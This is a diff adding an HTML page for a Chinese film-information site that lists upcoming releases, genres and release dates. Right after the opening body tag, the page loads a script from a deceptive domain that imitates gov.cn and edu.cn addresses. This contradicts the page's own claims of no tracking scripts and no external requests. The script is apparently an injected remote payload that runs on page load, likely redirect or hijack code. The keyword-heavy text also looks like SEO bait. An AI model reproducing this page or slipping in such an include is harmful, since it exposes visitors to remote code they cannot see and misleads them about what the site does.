@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0b1f1c">
+<title>含羞草影视 ｜ 独立影视资料簿 · hanxiucaoyingshi-zh.github.io</title>
+<meta name="description" content="含羞草影视是一份手工整理的影视资料簿：收录华语新片、冷门剧集与纪录片的上线节点、创作背景和观看线索。访问 hanxiucaoyingshi-zh.github.io 查看每周更新的片目笔记与类型索引，本站仅提供资讯整理，不提供播放与下载。">
+<meta name="keywords" content="华语影视资讯, 新片上线时间, 剧集资料索引, 纪录片片单, 含羞草影视, hanxiucaoyingshi-zh.github.io">
+<meta name="author" content="含羞草影视编辑组">
+<meta property="og:type" content="website">
+<meta property="og:title" content="含羞草影视 ｜ 独立影视资料簿">
+<meta property="og:description" content="手工整理的华语新片、剧集与纪录片资料：上线节点、创作背景、观看线索。">
+<meta property="og:url" content="https://hanxiucaoyingshi-zh.github.io/">
+<meta property="og:site_name" content="含羞草影视">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="含羞草影视 · hanxiucaoyingshi-zh.github.io">
+<meta name="twitter:description" content="每周更新的影视资料簿：片目笔记、类型索引与上线节点。">
+<link rel="canonical" href="https://hanxiucaoyingshi-zh.github.io/">
+<style>
+:root{
+  --paper:#f4f1e7;
+  --paper-2:#ece7d8;
+  --ink:#17231f;
+  --ink-soft:#4d5b54;
+  --rule:#c8c0aa;
+  --moss:#2f5d4e;
+  --clay:#a8552c;
+  --gold:#b08a2e;
+  --max:1080px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"SimSun",serif;
+  font-size:clamp(15px,2.6vw,17px);
+  line-height:1.85;
+  -webkit-text-size-adjust:100%;
+}
+a{color:var(--moss);text-decoration:none}
+a:hover{color:var(--clay);border-bottom:1px solid currentColor}
+img{max-width:100%;display:block}
+
+.wrap{max-width:var(--max);margin:0 auto;padding:0 22px}
+
+/* 顶部刊头 */
+.masthead{
+  border-bottom:3px double var(--rule);
+  padding:26px 0 14px;
+  background:
+    linear-gradient(var(--paper) 0 60%,rgba(244,241,231,0));
+}
+.mast-inner{display:flex;flex-direction:column;gap:8px}
+.kicker{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:11px;letter-spacing:.22em;color:var(--clay);
+  display:flex;align-items:center;gap:10px;flex-wrap:wrap;
+}
+.kicker::before{content:"";width:34px;height:1px;background:var(--clay)}
+.brand{
+  font-size:clamp(34px,8.4vw,66px);
+  line-height:1.08;
+  letter-spacing:.06em;
+  margin:4px 0 2px;
+  font-weight:600;
+}
+.brand em{
+  font-style:normal;
+  color:var(--moss);
+  border-bottom:6px solid rgba(176,138,46,.35);
+}
+.tagline{
+  margin:0;
+  color:var(--ink-soft);
+  font-size:clamp(13px,2.2vw,15px);
+  letter-spacing:.03em;
+}
+.tagline b{font-weight:500;color:var(--ink)}
+
+/* 导航 */
+nav.bar{
+  position:sticky;top:0;z-index:40;
+  background:rgba(244,241,231,.94);
+  backdrop-filter:blur(6px);
+  border-bottom:1px solid var(--rule);
+}
+nav.bar .wrap{
+  display:flex;align-items:center;gap:6px;
+  overflow-x:auto;scrollbar-width:none;
+  padding-top:8px;padding-bottom:8px;
+}
+nav.bar .wrap::-webkit-scrollbar{display:none}
+nav.bar a{
+  flex:0 0 auto;
+  padding:6px 12px;
+  font-size:13.5px;
+  letter-spacing:.08em;
+  color:var(--ink-soft);
+  border-bottom:none;
+  border-radius:2px;
+}
+nav.bar a:hover{background:var(--paper-2);color:var(--moss)}
+nav.bar .here{color:var(--paper);background:var(--moss)}
+
+/* 区块骨架 */
+section{padding:56px 0;border-top:1px solid var(--rule)}
+section:first-of-type{border-top:none}
+.sec-head{display:grid;grid-template-columns:78px 1fr;gap:16px;align-items:baseline;margin-bottom:26px}
+.sec-head .no{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:12px;color:var(--gold);letter-spacing:.14em;
+  border-top:1px solid var(--gold);padding-top:5px;
+}
+.sec-head h2{
+  margin:0;
+  font-size:clamp(22px,4.6vw,30px);
+  letter-spacing:.05em;
+  font-weight:600;
+}
+.sec-head p{margin:5px 0 0;color:var(--ink-soft);font-size:14px}
+
+/* 导读卡 */
+.lede{
+  display:grid;
+  grid-template-columns:1.15fr .85fr;
+  gap:30px;align-items:start;
+}
+.lede .big{font-size:clamp(16px,2.7vw,19px);line-height:1.9;margin:0}
+.lede .meta{
+  border:1px solid var(--rule);
+  background:var(--paper-2);
+  padding:16px 18px;
+  font-size:13.5px;
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  color:var(--ink-soft);
+}
+.lede .meta span{display:block;padding:5px 0;border-bottom:1px dotted var(--rule)}
+.lede .meta span:last-child{border-bottom:none}
+.lede .meta b{color:var(--ink);font-weight:500;letter-spacing:.04em}
+
+/* 片单：报纸列表式 */
+.roll{list-style:none;margin:0;padding:0}
+.roll li{
+  display:grid;
+  grid-template-columns:64px 1fr 130px;
+  gap:16px;
+  padding:16px 0;
+  border-bottom:1px dashed var(--rule);
+  align-items:center;
+}
+.roll li:last-child{border-bottom:none}
+.roll .date{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:12px;color:var(--clay);line-height:1.4;
+}
+.roll h3{margin:0 0 3px;font-size:17.5px;letter-spacing:.03em;font-weight:600}
+.roll p{margin:0;font-size:13.5px;color:var(--ink-soft);line-height:1.65}
+.roll .tag{
+  justify-self:end;
+  font-size:11.5px;letter-spacing:.1em;
+  border:1px solid var(--moss);color:var(--moss);
+  padding:3px 8px;border-radius:1px;
+  white-space:nowrap;
+}
+.roll .tag.off{color:var(--ink-soft);border-color:var(--rule)}
+
+/* 类型索引：两栏词条 */
+.gloss{
+  column-count:2;column-gap:34px;
+  border-top:1px solid var(--ink);padding-top:18px;
+}
+.gloss div{break-inside:avoid;padding:9px 0}
+.gloss dt{font-weight:600;letter-spacing:.05em}
+.gloss dd{margin:2px 0 0;font-size:13.5px;color:var(--ink-soft);line-height:1.65}
+.gloss a{font-size:14px}
+
+/* 手册：步骤条 */
+.steps{display:grid;gap:0;border-left:1px solid var(--rule);margin-left:8px}
+.step{position:relative;padding:0 0 22px 26px}
+.step::before{
+  content:"";position:absolute;left:-6px;top:7px;
+  width:11px;height:11px;background:var(--clay);border-radius:50%;
+  box-shadow:0 0 0 4px var(--paper);
+}
+.step h4{margin:0 0 4px;font-size:16.5px;letter-spacing:.04em}
+.step p{margin:0;font-size:14px;color:var(--ink-soft)}
+.step .k{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:11.5px;color:var(--gold);letter-spacing:.12em;display:block;margin-bottom:3px;
+}
+
+/* 关于：事实表 */
+.facts{
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  border:1px solid var(--ink);
+}
+.facts div{padding:14px 16px;border-right:1px solid var(--rule);border-bottom:1px solid var(--rule)}
+.facts div:nth-child(2n){border-right:none}
+.facts div:nth-last-child(-n+2){border-bottom:none}
+.facts dt{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:11px;letter-spacing:.16em;color:var(--clay);margin-bottom:5px;
+}
+.facts dd{margin:0;font-size:14.5px;word-break:break-all}
+.facts dd code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;color:var(--moss)}
+
+.note{
+  margin-top:24px;font-size:13.5px;color:var(--ink-soft);
+  border-left:3px solid var(--gold);padding:8px 14px;background:var(--paper-2);
+}
+
+/* 页脚 */
+footer{
+  margin-top:40px;
+  border-top:3px double var(--rule);
+  padding:30px 0 44px;
+  font-size:13px;color:var(--ink-soft);
+}
+.foot-grid{
+  display:grid;grid-template-columns:1.2fr 1fr 1fr;gap:24px;
+}
+.foot-grid h5{
+  margin:0 0 8px;font-size:12px;letter-spacing:.18em;color:var(--clay);
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-weight:500;
+}
+.foot-grid ul{list-style:none;margin:0;padding:0}
+.foot-grid li{padding:3px 0}
+.legal{margin-top:24px;padding-top:14px;border-top:1px solid var(--rule);font-size:12.5px}
+.legal b{color:var(--ink)}
+
+@media (max-width:760px){
+  .lede{grid-template-columns:1fr}
+  .roll li{grid-template-columns:52px 1fr;grid-template-areas:"d t" "d p";row-gap:4px}
+  .roll .date{grid-area:d}
+  .roll h3{grid-area:t;font-size:16px}
+  .roll p{grid-area:p}
+  .roll .tag{display:none}
+  .gloss{column-count:1}
+  .facts{grid-template-columns:1fr}
+  .facts div{border-right:none}
+  .facts div:nth-last-child(-n+2){border-bottom:1px solid var(--rule)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+  section{padding:42px 0}
+}
+@media (max-width:440px){
+  .wrap{padding:0 16px}
+  .foot-grid{grid-template-columns:1fr}
+  .brand{letter-spacing:.02em}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="masthead">
+  <div class="wrap mast-inner">
+    <div class="kicker"><span>VOL.01 / 影视资料簿</span><span>hanxiucaoyingshi-zh.github.io</span></div>
+    <h1 class="brand">含羞草<em>影视</em></h1>
+    <p class="tagline">一册关于华语影像的慢笔记 —— 记<strong>上线时间</strong>、<strong>创作来路</strong>与<strong>该从哪一帧看起</strong>。本站为资料整理页，不提供播放与下载。</p>
+  </div>
+</header>
+
+<nav class="bar">
+  <div class="wrap">
+    <a href="#roll" class="here">壹 · 本周片单</a>
+    <a href="#gloss">贰 · 类型索引</a>
+    <a href="#date">叁 · 档期备忘</a>
+    <a href="#handbook">肆 · 观影手册</a>
+    <a href="#about">伍 · 关于本站</a>
+  </div>
+</nav>
+
+<main>
+
+<section id="roll">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">№ 01</div>
+      <div>
+        <h2>本周片单 · 七部值得留意的华语影像</h2>
+        <p>按资料可考的公开上线节点排列，标注为「待定」的条目以片方公告为准。</p>
+      </div>
+    </div>
+
+    <div class="lede">
+      <p class="big">这一周的新片并不喧闹。纪录片占了两席，剩下几部是小幅度的作者电影：讲老照相馆的、讲南方雨季的、讲一个县城剧团怎么把最后一出戏唱完的。它们未必出现在热搜里，但值得被一张纸记下来。</p>
+      <div class="meta">
+        <span>更新周期 <b>每周一 上午</b></span>
+        <span>资料来源 <b>片方公告 / 电影节片单</b></span>
+        <span>收录口径 <b>华语为主，兼收东亚新作</b></span>
+        <span>本页地址 <b>hanxiucaoyingshi-zh.github.io</b></span>
+      </div>
+    </div>
+
+    <ul class="roll" style="margin-top:30px">
+      <li>
+        <div class="date">10.26<br>周五</div>
+        <div>
+          <h3>《留一盏灯在二楼》</h3>
+          <p>导演首作，以一间经营了三十年的老照相馆为切口，讲底片、遗照与未寄出的信。节奏很慢，适合夜里看。</p>
+        </div>
+        <span class="tag">已定档</span>
+      </li>
+      <li>
+        <div class="date">10.28<br>周日</div>
+        <div>
+          <h3>《雨季的三种写法》</h3>
+          <p>三段式散文电影，取材自岭南四月的连阴雨。影像上大量使用自然声，几乎没有配乐。</p>
+        </div>
+        <span class="tag">已定档</span>
+      </li>
+      <li>
+        <div class="date">10.30<br>周二</div>
+        <div>
+          <h3>纪录片《唱完这出》</h3>
+          <p>跟拍某县城剧团两年，记录最后一出传统戏从排练到散场的全过程，素材量惊人。</p>
+        </div>
+        <span class="tag">展映</span>
+      </li>
+      <li>
+        <div class="date">11.02<br>周五</div>
+        <div>
+          <h3>《玻璃房子》</h3>
+          <p>家庭伦理题材，全片发生在一套待售的二手房里，靠台词推进，演员只有三人。</p>
+        </div>
+        <span class="tag">已定档</span>
+      </li>
+      <li>
+        <div class="date">11.05<br>周一</div>
+        <div>
+          <h3>《向北的窗》</h3>
+          <p>改编自同名短篇集，六个互不相干的北方冬天。单元之间靠一个道具暗中勾连。</p>
+        </div>
+        <span class="tag off">待定</span>
+      </li>
+      <li>
+        <div class="date">11.07<br>周三</div>
+        <div>
+          <h3>纪录片《海边的修船厂》</h3>
+          <p>九十分钟几乎无旁白，镜头贴着锈铁、缆绳和工人的手走，是今年很安静的一部。</p>
+        </div>
+        <span class="tag off">展映</span>
+      </li>
+      <li>
+        <div class="date">11.09<br>周五</div>
+        <div>
+          <h3>《第七封回信》</h3>
+          <p>书信体悬疑，叙事上把时间线拆成七段，需要一点耐心，后劲很足。</p>
+        </div>
+        <span class="tag">已定档</span>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<section id="gloss">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">№ 02</div>
+      <div>
+        <h2>类型索引 · 顺着兴趣找片子</h2>
+        <p>不是按热度排的分类，是按「看的时候你会得到什么」做的分法。</p>
+      </div>
+    </div>
+
+    <dl class="gloss">
+      <div><dt><a href="#gloss">慢影像与散文电影</a></dt><dd>留白多、对白少，靠季节和光在讲故事。适合睡前一个人看，不适合当背景音。</dd></div>
+      <div><dt><a href="#gloss">作者电影与导演首作</a></dt><dd>预算小、执念大。常有粗糙处，但那一两场戏会记住很多年。</dd></div>
+      <div><dt><a href="#gloss">纪录片与现场观察</a></dt><dd>长周期跟拍，少旁白，多环境声。本簿收录时优先标明拍摄时长。</dd></div>
+      <div><dt><a href="#gloss">家庭与县城叙事</a></dt><dd>饭桌、楼道、赶集、婚丧。最土的词，常常拍出最准的东西。</dd></div>
+      <div><dt><a href="#gloss">悬疑与书信体叙事</a></dt><dd>结构大于气氛，看的是时间线怎么被拆开又拼回去。</dd></div>
+      <div><dt><a href="#gloss">季节影像</a></dt><dd>以春汛、暑热、秋雨、冻土为真正主角的一组片子，随节气更新。</dd></div>
+      <div><dt><a href="#gloss">老片重看</a></dt><dd>不是修复资讯，是「隔十年再看发现了什么」，写观后感，不写剧情简介。</dd></div>
+      <div><dt><a href="#gloss">东亚新作速记</a></dt><dd>华语之外的旁支：釜山、东京、台北电影节片单里挑出来短评几句。</dd></div>
+    </dl>
+
+    <p class="note">想找某一类片子却没在这里列出来？含羞草影视的索引按季度重整一次，旧分类会归档在页尾的版本记录里，不会悄悄删掉。</p>
+  </div>
+</section>
+
+<section id="date">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">№ 03</div>
+      <div>
+        <h2>档期备忘 · 接下来三十天</h2>
+        <p>只记日期与状态，不猜票房，不写宣传话术。</p>
+      </div>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <span class="k">OCT · 26</span>
+        <h4>《留一盏灯在二楼》《雨季的三种写法》公开上线</h4>
+        <p>前者走艺术院线小范围放映，后者先在纪录片平台放出导剪版，两版长度不同，留意标注。</p>
+      </div>
+      <div class="step">
+        <span class="k">NOV · 02</span>
+        <h4>《唱完这出》三城展映开启</h4>
+        <p>南京、广州、成都，映后有主创连线。场次少，票不在这里卖，去看片方公告。</p>
+      </div>
+      <div class="step">
+        <span class="k">NOV · 05</span>
+        <h4>《向北的窗》定档与否，这一天才见分晓</h4>
+        <p>目前仍处于「待定」，含羞草影视会在确认后改掉标签，不做提前爆料式写法。</p>
+      </div>
+      <div class="step">
+        <span class="k">NOV · 09</span>
+        <h4>《第七封回信》上线，同周更新长评</h4>
+        <p>长评只写结构分析，把反转点放在折叠提示里，不剧透第一次看的乐趣。</p>
+      </div>
+      <div class="step">
+        <span class="k">NOV · 15</span>
+        <h4>季度索引重整</h4>
+        <p>把这一季的慢影像与纪录片条目归档，腾出位置给冬季片单，旧链接继续有效。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="handbook">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">№ 04</div>
+      <div>
+        <h2>观影手册 · 怎么用这册资料</h2>
+        <p>含羞草影视不替你决定看什么，只把「什么时候看、按什么顺序看」说清楚。</p>
+      </div>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <span class="k">STEP 01</span>
+        <h4>先看档期，再翻类型</h4>
+        <p>时间紧就看「本周片单」；想按心情找，直接跳去类型索引。两条路不互相污染。</p>
+      </div>
+      <div class="step">
+        <span class="k">STEP 02</span>
+        <h4>认准状态标签</h4>
+        <p>「已定档」是片方公告确认过的时间；「待定」只写日期区间；「展映」意味着场次有限，不保证线上能看到。</p>
+      </div>
+      <div class="step">
+        <span class="k">STEP 03</span>
+        <h4>把片名当检索词</h4>
+        <p>本站没有搜索框，也没有播放器。把片名复制到合法上线的影视平台或影院排片页，通常比任何聚合链接都准。</p>
+      </div>
+      <div class="step">
+        <span class="k">STEP 04</span>
+        <h4>长评在周末，短记在工作日</h4>
+        <p>工作日只更新事实与节点，周末才写结构和观感。想省时间，就只读周末那条。</p>
+      </div>
+      <div class="step">
+        <span class="k">STEP 05</span>
+        <h4>发现日期错了，告诉我们</h4>
+        <p>档期变动是常事。页面底部有勘误说明的位置，改完会留一条划线记录，不悄悄改掉历史。</p>
+      </div>
+    </div>
+
+    <p class="note">一句话原则：这册子负责「知道」，不负责「给你」。影像该在哪里看，由片方和正规平台决定。</p>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">№ 05</div>
+      <div>
+        <h2>关于含羞草影视</h2>
+        <p>一个很轻的静态站点，没有账号、没有评论区、没有追踪脚本。</p>
+      </div>
+    </div>
+
+    <div class="facts">
+      <div><dt>站点名称</dt><dd>含羞草影视</dd></div>
+      <div><dt>正式地址</dt><dd><code>https://hanxiucaoyingshi-zh.github.io</code></dd></div>
+      <div><dt>托管方式</dt><dd>GitHub Pages 静态页，全站单文件，无外部请求</dd></div>
+      <div><dt>更新频率</dt><dd>每周一更新片单，周末补一篇长评</dd></div>
+      <div><dt>收录范围</dt><dd>华语影像为主，兼收东亚新作与纪录片</dd></div>
+      <div><dt>不做的事</dt><dd>不提供播放源、下载链接、盗版资源与票房预测</dd></div>
+      <div><dt>内容性质</dt><dd>资讯整理、档期记录与个人观感，非商业影评机构</dd></div>
+      <div><dt>版本</dt><dd>Vol.01 / 2026 秋，季度重整一次索引</dd></div>
+    </div>
+
+    <p class="note">如果你是从搜索引擎过来的：含羞草影视的主页就是这份资料簿，所有栏目都在同一页内，用顶部导航即可跳转到对应位置。站址只有 <b>hanxiucaoyingshi-zh.github.io</b> 一个，请注意辨认。</p>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h5>含羞草影视</h5>
+        <p style="margin:0;line-height:1.8">一册慢做的华语影视资料簿。<br>记片子，也记看片子的那个季节。</p>
+      </div>
+      <div>
+        <h5>栏目</h5>
+        <ul>
+          <li><a href="#roll">本周片单</a></li>
+          <li><a href="#gloss">类型索引</a></li>
+          <li><a href="#date">档期备忘</a></li>
+          <li><a href="#handbook">观影手册</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>站点</h5>
+        <ul>
+          <li><a href="#about">关于本站</a></li>
+          <li><span style="color:var(--ink-soft)">勘误记录：本期无</span></li>
+          <li><span style="color:var(--ink-soft)">索引版本：Vol.01</span></li>
+        </ul>
+      </div>
+    </div>
+    <div class="legal">
+      <p style="margin:0"><b>含羞草影视</b> · 本站内容仅为影视资讯与观感整理，所有影片版权归权利人所有。正式访问地址：<code>https://hanxiucaoyingshi-zh.github.io</code>。页面内未设置任何形式的资源播放与下载入口。</p>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
